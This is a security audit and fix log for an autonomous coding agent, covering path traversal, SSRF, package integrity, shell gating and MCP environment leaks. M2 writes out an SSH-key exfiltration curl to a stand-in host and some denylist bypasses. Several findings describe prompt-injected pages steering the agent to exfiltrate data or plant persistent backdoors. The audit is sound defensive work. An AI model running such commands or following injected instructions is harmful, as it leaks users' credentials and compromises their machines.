# NimAgent2 — Security Audit (2026-07-09)

Scope: full application — tool layer, extension/package system, provider/network
layer, secrets handling, MCP/bridge/router sidecars. Static review plus targeted
runtime checks of the exploitable claims.

## Trust model (read this first)

NimAgent is an **autonomous coding agent**: by design the LLM chooses to run
shell commands, write files, and execute code. The default permission posture is
**allow-all, no confirmation** (`permissions: {}` → `checkPermission` returns
`allow`). So the baseline is *"whoever controls the model's output can act on the
machine within the workspace and shell."* The security questions that matter are
therefore:

1. Can it **escape the intended workspace boundary**?
2. Can **untrusted input** (fetched web pages, MCP results, installed packages)
   escalate into code execution or exfiltration?
3. Are **secrets** handled safely?

Findings are ranked against that model.

## Findings

### HIGH

**H1 — Path traversal in the package installer (`src/integrations/registry.mjs`)**
`placePackage()` builds destinations straight from `manifest.name`:
`path.join(INSTALL_ROOT, "skills", manifest.name)` and
`extensions/${manifest.name}.js`, with **no validation**. Verified:
`manifest.name = "../../Users/ThePa/evil"` resolves to `C:\Users\ThePa\evil.js`
— fully outside `INSTALL_ROOT`. Because extension packages are **auto-executed on
next start**, a malicious or compromised registry (or any package whose name
contains `..`/separators) achieves arbitrary file write **and** code execution
anywhere the process can write. Note the inconsistency: `create_tool` *does*
validate (`/^[a-zA-Z0-9_-]+$/`); the installer does not.
*Fix:* validate `manifest.name`/`pkg.name` with the same regex, reject path
separators and `..`, and assert the resolved destination stays under
`INSTALL_ROOT` before writing.

**H2 — Weak package integrity / no authenticity (`registry.mjs`)**
The SHA-256 check is optional (`if (pkg.sha256)`), and the hash is served by the
**same registry** as the zip — so it defends against nothing an attacker who
controls the registry can't also change. There is no signature or key pinning.
Combined with H1, a compromised registry = silent persistent RCE.
*Fix:* require `sha256`; add detached-signature verification against a pinned
publisher key, or at minimum pin the registry over HTTPS + document the trust
assumption loudly.

### MEDIUM

**M1 — SSRF in `web_fetch` (`extensions/web-search.js`)**
Only guard is `^https?://`; redirects are followed; **no block on
loopback/link-local/private ranges**. Verified: `http://169.254.169.254/...`
(cloud metadata) passes the guard. A prompt-injected web page can steer the agent
to read cloud instance credentials or internal-only services and then exfiltrate
them via a second fetch. Higher impact because fetched content feeds an LLM that
drives tool execution.
*Fix:* resolve the hostname and reject RFC1918 / loopback / link-local / ULA /
`0.0.0.0` / metadata IPs; re-validate after each redirect (or `redirect: "manual"`).

**M2 — Shell risk gate is a bypassable blocklist (`src/tools/index.mjs` `commandRisk`)**
`run_shell` and `start_process` gate on a short regex denylist (recursive `rm`,
`format`, `shutdown`, …). It is trivially bypassed (`rm -fr`, `Remove-Item`
without a recurse flag, command built from variables, `curl -d @~/.ssh/id_rsa
evil.com` for exfil — none match). There is **no egress control**. This is
partly inherent to having a shell tool, but the gate reads as protection it
doesn't provide.
*Fix:* document it explicitly as a speed-bump, not a sandbox; offer an opt-in
allowlist / confirm-every-command mode; the real boundary should be OS-level
(container, restricted user).

**M3 — Plaintext HTTP provider endpoint (`src/core/config.mjs`)**
The `gwn` provider is `http://173.212.202.219:8000/v1` (also referenced by
`local`/`ollama` on loopback, which is fine). For a non-loopback host, prompts
and code — potentially proprietary — go **unencrypted**, and a MITM can alter the
model's *response*, which directly drives tool execution. The key is
`"not-needed"` so no credential leaks, but response tampering is the real risk.
*Fix:* use HTTPS for any non-loopback endpoint; warn when a chat/completion base
URL is non-loopback `http://`.

**M4 — Default allow-all, non-interactive permissions (`src/core/agent.mjs`)**
Every tool — `run_shell`, `create_tool`, `write_file`, `git_commit` — runs with
no confirmation out of the box. Defensible for an autonomous agent, but it should
be a *conscious* default.
*Fix:* consider shipping `create_tool`, `run_shell`, and writes outside cwd as
`"ask"` by default, overridable for power users.

### LOW / hardening

**L1 — `create_tool` = unconfirmed persistent code execution.** By design, but
it's the single most powerful tool (write + load + persist an extension that runs
on every future start). Under default allow-all, a prompt-injected agent can
install a persistent backdoor. Gate it behind confirmation even under allow-all,
or log its use prominently.

**L2 — Workspace guard ignores symlinks (`assertInsideWorkspace`).** Uses
`path.resolve`, not `fs.realpath`, so a symlink inside cwd pointing outside would
let `read_file`/`write_file` escape the boundary. Attacker must first create the
link, so low severity. *Fix:* realpath-check the resolved path.

**L3 — `git_commit({all:true})` runs `git add -A` with no secret guard.** If
`.env` isn't gitignored it gets committed. `security_scan` warns separately, but
the commit tool doesn't. *Fix:* skip/warn on known secret files (`.env`, key
files) before staging.

**L4 — Child processes inherit the full environment.** MCP servers
(`mcp.mjs`), the NimTools bridge, and the router sidecar all spawn with
`{...process.env}`, so every spawned process sees all API keys. Expected for MCP,
but a hostile MCP *config* entry = env exfiltration. Config is user-controlled, so
low, but worth a note in the MCP docs.

## What's done right (verified)

- **File tools enforce the workspace boundary consistently.** `read_file`,
  `write_file`, `edit_file`, `apply_patch` (incl. its internal Add/Update/Delete
  headers), `search`, `list_dir`, `find_files` all route paths through
  `resolve()`/`resolveForCreate()` → `assertInsideWorkspace`, which blocks `..`
  escapes and absolute paths.
- **`create_tool` validates its name** against `/^[a-zA-Z0-9_-]+$/` — no traversal
  (this is exactly the check H1 is missing).
- **Secrets are masked everywhere they display** (`maskKey` in `/apikey`,
  `/provider`, `/keys`). No unmasked key logging anywhere in `src/`.
- **`security_scan` never prints matched secret values** — only file:line.
- **No `eval`/`new Function` on model-controlled strings.** `create_tool` executes
  via `import()` of a written file (still code exec, but not string-eval).
- **Secrets hygiene in git is clean** (confirmed this session): `.env` and the
  `agent/` home dir are gitignored, git history contains only `nvapi-xxxxxxxx`
  placeholders, and the earlier fix keeps env-supplied keys out of `settings.json`.

## Suggested priority

1. H1 + H2 together (installer traversal + integrity) — this is the one path where
   *remote* input becomes *persistent local code execution*.
2. M1 (SSRF) — the main untrusted-input → exfil path.
3. M3 (HTTP endpoint), M4/L1 (confirm the most dangerous tools).
4. Hardening L2–L4.

## Addendum 1 (2026-07-09) — fixed same-day, in response to direct follow-up questions

Two threats not fully covered above got dedicated fixes after the user asked
specifically about (a) MCP servers being usable to harm others, and (b) the
agent modifying the Windows Registry / system config with no warning.

**High-risk system commands (registry, persistence, firewall, boot config)
now force a human confirmation that the model cannot bypass.**
`commandRisk()` in [tools/index.mjs](../src/tools/index.mjs) gained
registry/persistence/firewall/boot-config patterns, each with a specific
human-readable reason instead of one generic "destructive" label. More
importantly, `checkCommandRisk()` in [agent.mjs](../src/core/agent.mjs) now
gates any `run_shell`/`start_process` call matching a "blocked" pattern through
the same confirm-prompt mechanism as the permission system — independent of
the tool's configured permission (even `"allow"` doesn't skip it) and
independent of the model's own `allow_unsafe` flag (a human must actually type
`y`). No confirm callback available (one-shot/non-interactive mode) → denied,
never silently allowed. Verified live: a `reg add ...HKCU\...` call was denied
outright in one-shot mode, and in the REPL the prompt showed
`⚠ HIGH RISK — modifies the Windows Registry (autostart/security settings)`,
declining blocked it, approving let it through (verified with a harmless
scoped delete, not a real registry write, to avoid actually creating
persistence on the test machine).

**MCP can no longer be silently weaponized via an untrusted project config or
full environment inheritance.** Three changes to
[mcp.mjs](../src/integrations/mcp.mjs)/[extras.mjs](../src/integrations/extras.mjs)/[repl.mjs](../src/cli/repl.mjs),
closing the gap noted in M4/L4 above:

1. Servers sourced from a project-local `.mcp.json` (as opposed to your own
   `nimagent.config.json`) are tracked as untrusted and require a one-time
   human confirmation, fingerprinted per exact definition, before the first
   connection — cloning a repo can no longer silently register and connect to
   its MCP server. Non-interactive sessions refuse rather than silently
   connect.
2. stdio MCP servers get a minimal environment (PATH, locale, temp/home dirs)
   by default instead of full `process.env` inheritance — a server no longer
   automatically receives every API key in your shell. `inheritEnv: true` opts
   a specific server back in when it's genuinely needed.
3. The startup banner now names each MCP server and flags untrusted ones
   (`evilserver [project, untrusted]`) instead of showing only a count.

Verified live end-to-end with a mock stdio MCP server reporting whether a
canary env var reached it: default connection → `canary=absent`; same server
with `inheritEnv: true` → `canary=LEAKED:...` (confirming the opt-in genuinely
opts in, not just a no-op); changing the server's args after trust was granted
correctly re-triggered the confirmation requirement; `permissions.mcp = "deny"`
was confirmed to already block calls before mcp.mjs is ever reached (existing
generic permission mechanism, no gap there).

## Addendum 2 (2026-07-09) — remaining findings closed

Every finding above is now fixed and live-verified (real exploit attempts against
each, not just code review). No exceptions, no partial fixes left open.

**H1 — installer path traversal — FIXED.** [registry.mjs](../src/integrations/registry.mjs)
now validates both `manifest.name` (package's own manifest) and `pkg.name`
(registry.json's entry) against the same `/^[a-zA-Z0-9_-]+$/` charset
`create_tool` already used, checked before either name is used to build any
path. `manifest.entry` (a package-controlled relative path) also gets a
containment check, since it had the same class of gap — a malicious entry
could otherwise read a file from outside the extracted package. Defense in
depth: `placePackage`'s skill/extension destinations are also asserted inside
`INSTALL_ROOT` directly, not just via the name charset. Verified live: a
manifest named `../../../../Windows/Temp/evilext` was blocked, a registry entry
with that same traversal name was independently blocked, and a legitimate
correctly-named package still installs and uninstalls cleanly.

**H2 — weak package integrity — FIXED (hash now mandatory; signing still out of
scope).** `sha256` is no longer optional — a registry entry without one is
refused outright. `fetchRegistry`/`downloadZip` also now refuse plaintext
`http://` to any non-loopback host (`assertSecureUrl`), so registry.json and the
package zip both require a channel an on-path attacker can't quietly tamper
with. Full detached-signature verification against a pinned publisher key
remains a separate, larger feature — not built, and not pretended to be.
Verified live: an entry missing `sha256` was refused before any file was even
extracted.

**M1 — SSRF in `web_fetch` — FIXED.** [web-search.js](../extensions/web-search.js)
now resolves the hostname (DNS, not just parsing the literal string) and
rejects loopback/link-local/private/unique-local ranges — covering both a
literal internal IP in the URL and a hostname that merely *resolves* to one.
Redirects are followed manually, one hop at a time, re-validating every target
— `fetch(..., redirect:"follow")` would otherwise only ever check the first
URL. Verified live: `http://169.254.169.254/...` (cloud metadata), a loopback
address, a private-range address, and the `localhost` hostname were all
blocked; a real external site (`example.com`) and a real multi-hop
`http://github.com` → `https://github.com` redirect both still worked
correctly — the fix doesn't just block, it doesn't break normal use either.

**M3 — plaintext HTTP provider endpoint — addressed via visibility, not a
block.** A silent provider misconfiguration is worse than a visible one, but
outright blocking would break a setup someone may have chosen deliberately
(their own local/LAN inference server). [helpers.mjs](../src/cli/helpers.mjs)
now warns once at startup (REPL and one-shot) whenever the active model's
provider is plaintext `http://` to a non-loopback host — naming the exact
risk (requests *and model responses* are unencrypted and tamperable in
transit). Verified live: warns for `gwn` (the non-loopback `http://` provider),
stays silent for loopback (`local`/`ollama`) and HTTPS providers.

**M4 / L1 — default allow-all permissions — scoped fix, reasoning below.**
The audit's suggested fix ("ship `create_tool`/`run_shell`/writes outside cwd
as `ask` by default") was reconsidered rather than applied wholesale:

- `create_tool` — **FIXED, unconditionally.** It's the single most powerful
  tool (installs code that runs on every future launch, indefinitely, until
  manually removed) and is called rarely, so gating it costs almost nothing in
  friction. [agent.mjs](../src/core/agent.mjs) now forces a human confirmation
  for *every* `create_tool` call, independent of its configured permission —
  same unbypassable shape as the registry-command gate in Addendum 1 above. No
  confirm callback (non-interactive) → denied. Verified live: denied outright
  in one-shot mode; in the REPL, declining blocked it and approving correctly
  let it proceed to `create_tool`'s own logic.
- `run_shell` blanket-`ask`-by-default — **not implemented, deliberately.**
  `run_shell` is used *constantly* in ordinary agent operation (tests, builds,
  git plumbing) — making every call prompt would be far more disruptive than
  protective, and the sharpest edge of this risk (registry/persistence/
  destructive commands) is already hard-gated unconditionally by the
  Addendum-1 fix above, which covers exactly the category that matters without
  taxing routine use.
- "Writes outside cwd" — **not a live gap to fix.** Every write tool already
  routes through `resolveForCreate`/`assertInsideWorkspace`, which blocks
  writing outside cwd entirely (not just leaves it unconfirmed) — reinforced
  further by the symlink fix in L2 below.

**L2 — workspace guard ignored symlinks — FIXED.** `assertInsideWorkspace`
in [tools/index.mjs](../src/tools/index.mjs) did a purely lexical containment
check (`path.relative`), which doesn't follow symlinks — a symlink inside cwd
pointing outside it would pass undetected. It now also realpath-resolves the
nearest existing ancestor of the target (walking up when the target itself
doesn't exist yet, e.g. a new file being created) and re-checks containment
against the workspace root's own realpath. Verified live with a real Windows
directory junction inside a test workspace pointing at an outside directory:
both reading and writing through it were blocked with a clear "escapes
workspace via a symlink" error; a normal file read, and creating a brand-new
file that doesn't exist yet, both still worked correctly.

**L3 — `git_commit` had no secret guard — FIXED.** Before committing (both
`all:true` and explicit `paths`), candidate files are checked against a
conservative secret-filename list (`.env` and its variants, `*.pem`/`*.key`/
`*.pfx`/`*.p12`, SSH private key names, `credentials.json`, `service-account*.json`)
excluding conventionally-safe suffixes (`.example`/`.sample`/`.template`), and
skipped via `git reset` if not already gitignored — the commit proceeds with
everything else, with a clear warning naming what was excluded and why. If
nothing else was staged, the commit is refused with a message explaining that
too, rather than a bare "nothing to commit." Verified live in a scratch git
repo: a mixed commit (normal file + `.env` + a fake `.pem`) committed only the
normal file and reported the two skips by name; `.env.example` was correctly
left alone (allowlisted); naming `.env` explicitly via `paths` was *also*
blocked, not just the `all:true` path; a normal commit with no secrets involved
was unaffected.

## Status: all findings closed

Every finding from the original audit (H1, H2, M1–M4, L1–L4) is now either
fixed and live-verified, or explicitly scoped out with reasons recorded above
(full signing for H2; blanket `run_shell` confirmation for M4). Nothing is
silently unresolved. Full test suite (43 tests) passes after every change in
both addenda.
